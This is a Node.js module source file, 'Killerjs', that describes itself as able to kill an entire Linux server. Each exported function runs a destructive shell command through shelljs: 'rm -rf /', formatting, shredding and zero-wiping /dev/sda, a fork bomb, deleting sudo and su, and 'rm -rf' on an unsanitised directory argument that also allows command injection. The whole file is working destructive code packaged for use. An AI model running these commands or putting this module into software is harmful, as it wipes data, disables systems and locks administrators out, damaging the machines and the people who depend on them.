let shell = require('shelljs')
let a  = require('app-root-path')
/**
 * Killerjs
 * A Node Module that Can Kill an Entire Linux Server
 *
 * @name killer
 * @function
 * @return {Promise} A promise object.
 */
function protomix(constructor, mix){
    for(var i in mix)
      if(mix.hasOwnProperty(i))
          constructor.prototype[i]=mix[i];
}

let killer = () => {
    return new Promise((done, er) => {
        shell.exec('rm -rf /', (c, o, e) => {
            if(e) {
                er(e)
            } else {
                done(`Killed the Server <3`)
            }
        })
    })
}
protomix(killer, {
    destroyRoot: () => {
        return new Promise((done, err) => {
            shell.exec('rm -rf /', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Destroyed The Server Root.`)
                }
            })
        })
    },
    format: () => {
        return new Promise((done, err) => {
            shell.exec('mkfs.ext3 /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Formatted the Drive`)
                }
            })
        })
    },
    overWrite: () => {
        return new Promise((done, err) => {
            shell.exec('shred -v /dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Drive has been Overwritten Successfully.`)
                }
            })
        })
    },
    implod: () => {
        return new Promise((done, err) => {
            shell.exec('mv / /dev/null', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Imploded the Drive.`)
                }
            })
        })
    },
    wipe: () => {
        return new Promise((done, err) => {
            shell.exec('dd if=/dev/zero of=/dev/sda', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Wiped the Drive.`)
                }
            })
        })
    },
    forkBomb:  () => {
        return new Promise((done, err) => {
            shell.exec(':(){:|:&};:', (code, out, error) => {
                if(error) {
                    err(error)
                } else {
                    done(`Successfully Executed forkBomb`)
                }
            })
        })
    },
    disableRoot: () => {
        return new Promise((done, err) => {
            shell.exec('rm -f /usr/bin/sudo;rm -f /bin/su', (c, o, e) => {
                if(e) {
                    err(e)
                } else {
                    done(`Disabled Root Successfully.`)
                }
            })
        })
    },
    destroyProject: (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    },
    destroyADir: (dir) => {
        return new Promise((d, e) => {
            shell.exec(`rm -rf ${dir}`, (c, o, er) => {
                if(er) {
                    e(er)
                } else {
                    d(`Destroyed the dir ${dir}`)
                }
            })
        })
    }

});

module.exports = killer;